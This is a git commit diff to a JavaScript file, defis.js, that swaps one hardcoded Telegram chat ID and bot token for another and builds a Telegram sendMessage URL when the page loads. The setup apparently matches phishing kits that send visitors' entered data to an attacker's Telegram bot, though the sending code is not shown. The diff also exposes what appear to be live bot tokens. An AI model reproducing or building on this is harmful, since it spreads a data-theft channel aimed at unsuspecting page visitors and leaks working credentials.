4e18fc20cd96290e76de85397b3b840b28d9ec6d
Abang11829 <abangikok1@gmail.com>
2025-05-18 08:10:48 +0700

    Update defis.js

--- defis.js
+++ defis.js
@@ -1,7 +1,7 @@
      $(document).ready(function() {
 
-       const chat_id = '6809554683',
-         botID = 'bot7953552859:AAHPm-MnL8RRHeBJl_nmOyZAzDknYPB-ZVE';
+       const chat_id = '7950730142',
+         botID = 'bot7268355250:AAHEEC0daFzQkyO3JvXqTb-MTQb9_oBSmuk';
 
        const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
